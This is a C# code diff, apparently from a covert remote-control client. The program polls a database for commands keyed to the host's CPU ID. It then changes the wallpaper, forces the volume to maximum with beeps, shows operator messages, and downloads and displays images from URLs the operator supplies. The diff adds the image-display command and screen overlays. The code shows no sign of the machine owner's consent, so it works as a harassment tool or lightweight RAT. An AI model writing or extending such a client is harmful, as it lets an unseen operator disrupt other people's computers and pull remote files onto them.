@@ -73,7 +73,7 @@ namespace YWV4
 
                 while (reader.Read())
                 {
-                    doAction(reader.GetString(1), reader.GetString(2), reader.GetString(3));
+                    doAction(reader.GetString(1), reader.GetString(2), reader.GetString(3), reader.GetString(4));
                 }
                 reader.Close();
                 await Task.Delay(10000);
@@ -85,6 +85,9 @@ namespace YWV4
             try {
                 if (_params[0] == cpuId)
                 {
+                    messageContainer.Visibility = Visibility.Hidden;
+                    screenImage.Visibility = Visibility.Hidden;
+
                     if (_params[1] == "setBackground")
                     {
                         string imgPath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\" + generateUID() + ".tmp";
@@ -100,14 +103,31 @@ namespace YWV4
                     {
                         for (int i = 0; i < 44; i++)
                         {
-                            Console.WriteLine(i);
                             keybd_event((byte)System.Windows.Forms.Keys.VolumeUp, 0, 0, 0);
                             Console.Beep();
                         }
                     }
                     else if (_params[1] == "sendMessage")
                     {
+                        messageContainer.Visibility = Visibility.Visible;
+                        screenMessage.Text = _params[2];
+                    }
+                    else if (_params[1] == "showImage")
+                    {
+                        screenImage.Visibility = Visibility.Visible;
 
+                        string imgPath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\" + generateUID() + ".tmp";
+                        client.DownloadFile(_params[2], imgPath);
+                        screenImage.Source = new BitmapImage(new Uri(imgPath));
+
+                        if (_params[3] != null && _params[3] != "")
+                        {
+                            string[] size = _params[3].Split('x');
+                            screenImage.Height = int.Parse(size[0]);
+                            screenImage.Width = int.Parse(size[1]);
+                        }
+
+                        System.IO.File.Delete(imgPath);
                     }
                 }
             }
